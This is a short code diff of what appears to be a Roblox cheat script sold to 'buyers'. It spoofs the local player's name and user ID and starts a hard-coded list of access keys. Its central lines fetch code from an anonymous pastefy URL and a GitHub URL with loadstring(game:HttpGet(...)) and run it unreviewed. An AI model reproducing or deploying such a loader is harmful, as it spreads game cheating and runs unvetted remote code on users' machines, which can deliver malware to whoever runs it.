@@ -2,10 +2,7 @@ game.Players.LocalPlayer.Name = "mygame43"
 game.Players.LocalPlayer.UserId = "912348"
 loadstring(game:HttpGet("https://pastefy.app/nTehfRWs/raw"))()
 
-wait(.1)
-
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
-
 OrionLib:MakeNotification({
     Name = "",
     Content = "Welcome To Buyer",
@@ -30,6 +27,7 @@ OrionLib:MakeNotification({
     Image = "rbxassetid://10709813383",
     Time = 3
 })
+
 local keylist = {
     "VUGJGFAFF:1164921593466724485",
     "LMQQKXVDM:1118487461270650910",
